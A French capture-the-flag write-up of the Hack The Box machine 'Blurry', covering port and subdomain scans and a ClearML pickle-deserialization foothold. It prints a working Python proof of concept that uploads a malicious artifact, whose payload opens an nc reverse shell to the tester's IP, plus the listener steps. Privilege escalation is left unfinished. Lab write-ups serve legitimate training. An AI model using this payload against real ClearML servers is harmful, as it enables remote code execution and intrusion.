  # Blurry

	echo "10.10.11.19 app.blurry.htb" >> /etc/hosts
    echo "10.10.11.19 chat.blurry.htb" >> /etc/hosts
    echo "10.10.11.19 files.blurry.htb" >> /etc/hosts
    echo "10.10.11.19 api.blurry.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.19 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.19 -oN nmap.txt
	feroxbuster --silent -u http://app.blurry.htb
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
    80/tcp open  http    nginx 1.18.0

Fuzzing supplémentaire : 

    ffuf -H "Host: FUZZ.blurry.htb" -u http://app.blurry.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 169 -c
    
Deux autres sous-domaines trouvés : 

    files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 1442ms]
    app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 164ms]
    chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 1450ms]


http://files.blurry.htb/ => Rien
<br>http://chat.blurry.htb/ => Rocket.Chat

Le site app.blurry.htb, sur lequel on arrive par défaut, nous permet de nous connecter en demandant juste un nom. On arrive ensuite sur un ensemble de projets et on voit que c'est du ClearML.

Dans le projet "Black Swan" présent par défaut, il y a un script "review_tasks" qui vérifie les tâches contenant le tag "review" en les ouvrant et en les fermant chaque minute.

On peut ajouter une clé API dans http://app.blurry.htb/settings/workspace-configuration 

Setup : 

    pip install clearml
    clearml-init
    # Coller les credentials du site
    # Bien ajouter api.blurry.htb dans /etc/hosts

Un CVE récent existe et permet une RCE par désérialisation.

Voir : 
- https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/

PoC : 

    import pickle
    import os
    from clearml import Task

    class RCE:
        def __reduce__(self):
            cmd = ("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.61 9999 > /tmp/f")
            return os.system, (cmd,)

    task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"], output_uri=True)

    task.upload_artifact(name='pickle_artifact', artifact_object=RCE(), retries=2, wait_on_upload=True)


Déroulé du PoC : 

    vim exp.py
    rlwrap nc -nvlp 9999
    python exp.py

Après un peu d'attente, on reçoit bien le shell en tant que Jippity : 

	cat ~/user.txt 

## Élévation de privilèges

TO DO
